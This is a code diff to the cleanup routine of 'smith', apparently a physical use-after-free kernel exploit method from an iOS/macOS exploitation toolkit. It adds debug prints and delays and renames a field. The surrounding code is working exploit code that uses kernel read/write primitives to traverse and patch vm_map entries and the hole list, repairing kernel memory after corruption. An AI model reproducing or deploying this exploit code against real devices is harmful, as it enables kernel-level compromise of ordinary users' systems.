@@ -140,7 +140,11 @@ void smith_run(struct kfd* kfd)
  */
 void smith_cleanup(struct kfd* kfd)
 {
+    printf("????\n");
+    usleep(100000);
     smith_helper_cleanup(kfd);
+    printf("!!!!\n");
+    usleep(100000);
 
     struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
     u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
@@ -354,7 +358,7 @@ void* smith_helper_cleanup_pthread(void* arg)
          * Find the last entry with vme_end smaller than the map's max_offset,
          * with a right child that is not null, but not the entry we are going to leak.
          */
-        u64 map_kaddr = kfd->info.kaddr.current_map;
+        u64 map_kaddr = kfd->info.kernel.current_map;
         u64 entry_kaddr = dynamic_kget(vm_map, hdr_links_prev, map_kaddr);
 
         while (true) {
@@ -393,8 +397,10 @@ void* smith_helper_cleanup_pthread(void* arg)
  */
 void smith_helper_cleanup(struct kfd* kfd)
 {
-    assert(kfd->info.kaddr.current_map);
+    assert(kfd->info.kernel.current_map);
     struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
+    printf("ZZZZZ!\n");
+    usleep(100000);
 
     if (take_vm_map_lock) {
         atomic_store(&smith->cleanup_vme.should_start, true);
@@ -408,8 +414,9 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         usleep(100);
     }
-
-    u64 map_kaddr = kfd->info.kaddr.current_map;
+    printf("ZZZZZZZ!\n");
+    usleep(100000);
+    u64 map_kaddr = kfd->info.kernel.current_map;
 
     do {
         /*
@@ -432,7 +439,8 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 leaked_entry_prev = 0;
         u64 leaked_entry_next = 0;
         u64 leaked_entry_end = 0;
-
+        printf("ZZZZZZZZZ!\n");
+        usleep(100000);
         while (entry_kaddr != map_entry_kaddr) {
             entry_count++;
             u64 entry_next = static_kget(vm_map_entry, u64, links.next, entry_kaddr);
@@ -469,6 +477,7 @@ void smith_helper_cleanup(struct kfd* kfd)
             }
 
             entry_kaddr = entry_next;
+            printf("ZZZZZZZZZZZ!\n");
         }
 
         /*
@@ -518,7 +527,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         dynamic_kset_u64(vm_map, hint, map_kaddr, map_entry_kaddr);
     } while (0);
-
+    printf("ZZZZZZZZZZZZZZZZZZ!\n");
     do {
         /*
          * Scan hole list: we use the kread primitive to loop through every hole
@@ -537,6 +546,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 second_leaked_hole_next = 0;
 
         while (true) {
+            printf("XXXXXX!\n");
             hole_count++;
             u64 hole_next = static_kget(vm_map_links, u64, next, hole_kaddr);
             u64 hole_start = static_kget(vm_map_links, u64, start, hole_kaddr);
@@ -571,6 +581,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         static_kset_u64(vm_map_links, prev, first_leaked_hole_next, first_leaked_hole_prev);
         static_kset_u64(vm_map_links, next, second_leaked_hole_prev, second_leaked_hole_next);
         static_kset_u64(vm_map_links, prev, second_leaked_hole_next, second_leaked_hole_prev);
+        printf("XXXXXXY!\n");
 
         /*
          * Patch map->hole_hint.
@@ -580,6 +591,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         dynamic_kset_u64(vm_map, hole_hint, map_kaddr, first_hole_kaddr);
     } while (0);
+    printf("XXXXXXYZ!\n");
 
     if (take_vm_map_lock) {
         /*
